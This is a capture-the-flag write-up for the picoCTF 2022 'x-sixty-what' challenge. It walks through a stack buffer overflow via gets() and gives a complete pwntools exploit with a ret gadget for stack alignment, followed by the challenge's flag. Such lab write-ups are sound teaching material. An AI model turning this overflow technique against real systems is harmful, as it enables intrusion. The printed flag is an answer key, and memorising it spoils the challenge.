# x-sixty-what #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2022, Buffer Overflow

## Description ##
Overflow x64 code

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. I first check the binary security using `checksec`:

    Arch:     amd64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

 Then I move to inspecting the C file, I can see that the `flag` function prints the flag:

    void flag() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(buf,FLAGSIZE,f);
    printf(buf);
    }

Then you have the `vuln` function that gets the user input via `gets`:

    void vuln(){
    char buf[BUFFSIZE];
    gets(buf);
    }

The `gets` function does not check for bounds, which means I can perform a buffer overflow attack. Thus I can override the return address of the `vuln` function to point to the `flag` function. I first get the address of the `flag` function using `objdump -d vuln`:

    0000000000401236 <flag>:
    401236:       f3 0f 1e fa             endbr64
                    .
                    .
                    .
    4012b1:        c3                      ret

Next, I needed to get the offset from the start of the buffer to the return address. This can be done by using `cyclic` from pwntools to generate a unique pattern and then using `cyclic -l` to find the offset:

    pwndbg> cyclic -l jaaaaaaa
    Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
    Found at offset 72

Now that I got the offset and the address of the `flag` function, I can create a payload that will overflow the buffer:

    from pwn import *

    # PORT will vary
    HOST = 'saturn.picoctf.net'
    PORT = 63018

    p = remote(HOST, PORT)

    #p = process('./vuln')

    # Stack pointer must be 16 bytes aligned for 64 bit x86, so found a ret address.
    ret = 0x40101a

    # Since it is a amd64 architecture, must pack address into 64
    payload = b'a'*72 + p64(ret)

    payload += p64(0x401236)

    p.sendline(payload)

    p.interactive()

Because this is an amd64 binary, the System V ABI requires the stack to be 16-byte aligned at function entry. Returning directly into `flag` leaves the stack misaligned, which causes a crash in `movaps`. Adding a single `ret` gadget fixes the alignment.

Running the script, I got the flag:

    Welcome to 64-bit. Give me a string that gets you the flag:
    picoCTF{b1663r_15_b3773r_d95e02b6}

Flag: picoCTF{b1663r_15_b3773r_d95e02b6}

## Reflection ## 
This challenge deals with a classic buffer overflow, but it also tests your understanding of stack alignment on x86-64. I initially tried to return directly to the flag function, but the program consistently crashed. Even though the exploit appeared to work locally at first, it failed reliably on the remote server. 

Through debugging, I learned that on amd64 systems the stack must be 16-byte aligned at function entry. Returning directly into `flag` left the stack misaligned, causing a segmentation fault when the program executed SSE instructions such as `movaps`. Adding a single `ret` gadget before the flag function corrected the stack alignment and allowed the exploit to succeed. 


